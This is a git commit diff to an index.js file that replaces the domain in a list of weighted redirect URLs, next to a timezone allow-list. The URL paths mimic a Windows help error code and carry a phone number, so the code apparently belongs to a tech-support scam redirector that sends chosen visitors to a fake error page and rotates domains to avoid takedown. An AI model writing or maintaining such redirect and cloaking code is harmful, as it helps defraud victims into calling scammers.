ac78d481620c6923c6ffb7c5e03a509380fb2788
paalakash <palaksh452@gmail.com>
2026-06-05 06:53:30 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://dsjhgfassdvsfd.on-forge.com/W6i34nHelpSh0errc0de030/index.html?Anph=1800-182-567", weight: 0.5 },
-    { url: "https://dsjhgfassdvsfd.on-forge.com/W6i34nHelpSh0errc0de030/index.html?Anph=1800-182-567", weight: 0.5 }
+    { url: "https://qweuytrdfgf.on-forge.com/W6i34nHelpSh0errc0de030/index.html?Anph=1800-182-567", weight: 0.5 },
+    { url: "https://qweuytrdfgf.on-forge.com/W6i34nHelpSh0errc0de030/index.html?Anph=1800-182-567", weight: 0.5 }
 
 ];
 
